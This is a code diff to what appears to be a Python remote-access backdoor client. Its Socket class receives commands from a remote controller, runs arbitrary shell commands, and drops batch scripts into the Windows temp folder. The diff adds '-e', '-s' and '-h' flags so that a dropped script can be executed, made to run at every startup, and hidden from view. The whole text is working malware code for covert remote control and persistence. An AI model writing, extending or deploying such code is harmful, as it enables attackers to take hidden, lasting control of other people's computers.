@@ -28,11 +28,27 @@ class Socket:
             return False
 
         cmd = cmd.decode()
-        if cmd[0:5] == "batch":
-            drop_and_execute(cmd[6:])
-            return True
-        elif cmd[0:6] == "sbatch":
-            drop_and_execute(cmd[7:], startup=True)
+
+        # Initialize variables
+        execute = False
+        startup = False
+        hide_file = False
+
+        if "-batch" in cmd:
+
+            if "-e" in cmd:
+                execute = True
+                cmd = cmd.replace("-e ", "")
+            if "-s" in cmd:
+                startup = True
+                cmd = cmd.replace("-s ", "")
+            if "-h" in cmd:
+                hide_file = True
+                cmd = cmd.replace("-h ", "")
+            cmd = cmd.replace("-batch ", "")
+
+            drop_and_execute(cmd, execute_file=execute, startup=startup, hide_file=hide_file)
+
         else:
             try:
                 output = check_output(cmd, shell=True)
@@ -52,7 +68,7 @@ class Socket:
             self.established = False
 
 
-def drop_and_execute(script, execute_file=True, startup=False, hide_file=False):
+def drop_and_execute(script, execute_file=False, startup=False, hide_file=False):
     if not script:
         return
     # Format script
@@ -68,8 +84,11 @@ def drop_and_execute(script, execute_file=True, startup=False, hide_file=False):
         path = getenv("temp") + "\\" + file_name
 
     # Drop file
-    with open(path, "w+")as f:
-        f.write(script)
+    try:
+        with open(path, "w+")as f:
+            f.write(script)
+    except PermissionError:
+        return
 
     # Execute File
     if execute_file:
